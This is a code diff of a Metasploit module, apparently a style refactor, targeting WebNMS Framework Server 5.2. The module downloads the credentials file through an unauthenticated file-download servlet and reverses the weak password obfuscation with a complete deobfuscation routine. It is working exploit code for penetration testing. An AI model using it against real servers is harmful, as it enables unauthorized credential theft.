@@ -6,14 +6,15 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name' => 'WebNMS Framework Server Credential Disclosure',
-      'Description' => %q{
+    super(
+      update_info(
+        info,
+        'Name' => 'WebNMS Framework Server Credential Disclosure',
+        'Description' => %q(
 This module abuses two vulnerabilities in WebNMS Framework Server 5.2 to extract
 all user credentials. The first vulnerability is a unauthenticated file download
 in the FetchFile servlet, which is used to download the file containing the user
@@ -21,34 +22,64 @@ credentials. The second vulnerability is that the the passwords in the file are
 obfuscated with a very weak algorithm which can be easily reversed.
 This module has been tested with WebNMS Framework Server 5.2 and 5.2 SP1 on
 Windows and Linux.
-},
-      'Author' =>
-        [
-          'Pedro Ribeiro <pedrib[at]gmail.com>' # Vulnerability discovery and MSF module
-        ],
-      'License' => MSF_LICENSE,
-      'References' =>
-        [
-          [ 'URL', 'https://blogs.securiteam.com/index.php/archives/2712' ]
-        ],
-      'DisclosureDate' => 'Jul 4 2016'))
+),
+        'Author' =>
+          [
+            'Pedro Ribeiro <pedrib[at]gmail.com>' # Vulnerability discovery and MSF module
+          ],
+        'License' => MSF_LICENSE,
+        'References' =>
+          [
+            [ 'URL', 'https://blogs.securiteam.com/index.php/archives/2712' ]
+          ],
+        'DisclosureDate' => 'Jul 4 2016'
+      )
+    )
 
     register_options(
       [
         OptPort.new('RPORT', [true, 'The target port', 9090]),
-        OptString.new('TARGETURI', [ true,  "WebNMS path", '/'])
-      ], self.class)
+        OptString.new('TARGETURI', [true, "WebNMS path", '/'])
+      ],
+      self.class
+    )
   end
 
+  def version_check
+    begin
+      res = send_request_cgi(
+        'uri'      => normalize_uri(target_uri.path, 'servlets', 'FetchFile'),
+        'method'   => 'GET',
+        'vars_get' => { 'fileName' => 'help/index.html' }
+      )
+    rescue Rex::ConnectionRefused, Rex::ConnectionTimeout,
+           Rex::HostUnreachable, Errno::ECONNRESET => e
+      vprint_error("Failed to get Version: #{e.class} - #{e.message}")
+      return
+    end
+    if res && res.code == 200 && !res.body.empty?
+      title_string = res.get_html_document.at('title').to_s
+      version = title_string.match(/[0-9]+.[0-9]+/)
+      vprint_status("Version Detected = #{version}")
+    end
+  end
 
   def run
-    res = send_request_cgi({
-      'uri' => normalize_uri(target_uri.path, 'servlets', 'FetchFile'),
-      'method' =>'GET',
-      'vars_get' => { 'fileName' => 'conf/securitydbData.xml' }
-    })
+    # version check will not stop the module, but it will try to
+    # determine the version and print it if verbose is set to true
+    version_check
+    begin
+      res = send_request_cgi(
+        'uri'      => normalize_uri(target_uri.path, 'servlets', 'FetchFile'),
+        'method'   => 'GET',
+        'vars_get' => { 'fileName' => 'conf/securitydbData.xml' }
+      )
+    rescue Rex::ConnectionRefused, Rex::ConnectionTimeout,
+           Rex::HostUnreachable, Errno::ECONNRESET => e
+      print_error("Module Failed: #{e.class} - #{e.message}")
+    end
 
-    if res && res.code == 200 && res.body.to_s.length > 0
+    if res && res.code == 200 && !res.body.empty?
       cred_table = Rex::Ui::Text::Table.new(
         'Header'  => 'WebNMS Login Credentials',
         'Indent'  => 1,
@@ -61,18 +92,21 @@ Windows and Linux.
       print_status "#{peer} - Got securitydbData.xml, attempting to extract credentials..."
       res.body.to_s.each_line { |line|
         # we need these checks because username and password might appear in any random position in the line
-        if line =~ /username="([\w]*)"/
-          username = $1
-          if line =~ /password="([\w]*)"/
-            password = $1
-            plaintext_password = super_retarded_deobfuscation(password)
-            cred_table << [ username, plaintext_password ]
-            register_creds(username, plaintext_password)
-          end
+        if line.include? "username="
+          username = line.match(/username="([\w]*)"/)[1]
+        end
+        if line.include? "password="
+          password = line.match(/password="([\w]*)"/)[1]
+        end
+        if password && username
+          plaintext_password = super_redacted_deobfuscation(password)
+          cred_table << [ username, plaintext_password ]
+          register_creds(username, plaintext_password)
         end
       }
+
       print_line
-      print_line("#{cred_table}")
+      print_line(cred_table.to_s)
       loot_name     = 'webnms.creds'
       loot_type     = 'text/csv'
       loot_filename = 'webnms_login_credentials.csv'
@@ -83,18 +117,18 @@ Windows and Linux.
         rhost,
         cred_table.to_csv,
         loot_filename,
-        loot_desc)
+        loot_desc
+      )
       print_status "Credentials saved in: #{p}"
       return
     end
   end
 
-
-  # Returns the plaintext of a string obfuscated with WebNMS's super retarded obfuscation algorithm.
+  # Returns the plaintext of a string obfuscated with WebNMS's super redacted obfuscation algorithm.
   # I'm sure this can be simplified, but I've spent far too many hours implementing to waste any more time!
-  def super_retarded_deobfuscation (ciphertext)
+  def super_redacted_deobfuscation(ciphertext)
     input = ciphertext
-    input = input.gsub("Z","000")
+    input = input.gsub("Z", "000")
 
     base = '0'.upto('9').to_a + 'a'.upto('z').to_a + 'A'.upto('G').to_a
     base.push 'I'
@@ -106,7 +140,7 @@ Windows and Linux.
     co = input.length / 6
 
     while k < co
-      part = input[(6 * k),6]
+      part = input[(6 * k), 6]
       partnum = ''
       startnum = false
 
@@ -118,7 +152,7 @@ Windows and Linux.
             isthere = true
             partnum += pos.to_s
             if pos == 0
-              if not startnum
+              if !startnum
                 answer += "0"
               end
             else
@@ -152,7 +186,7 @@ Windows and Linux.
     end
 
     if input.length % 6 != 0
-      ending = input[(6*k)..(input.length)]
+      ending = input[(6 * k)..(input.length)]
       partnum = ''
       if ending.length > 1
         i = 0
@@ -165,7 +199,7 @@ Windows and Linux.
               isthere = true
               partnum += pos.to_s
               if pos == 0
-                if not startnum
+                if !startnum
                   answer += "0"
                 end
               else
@@ -179,7 +213,7 @@ Windows and Linux.
         isthere = false
         pos = 0
         until isthere
-          if ending[i+1] == base[pos]
+          if ending[i + 1] == base[pos]
             isthere = true
             remainder = pos
           end
@@ -202,11 +236,10 @@ Windows and Linux.
 
     final = ''
     for k in 0..((answer.length / 2) - 1)
-      final.insert(0,(answer[2*k,2].to_i + 28).chr)
+      final.insert(0, (answer[2 * k, 2].to_i + 28).chr)
     end
     final
   end
-
 
   def register_creds(username, password)
     credential_data = {
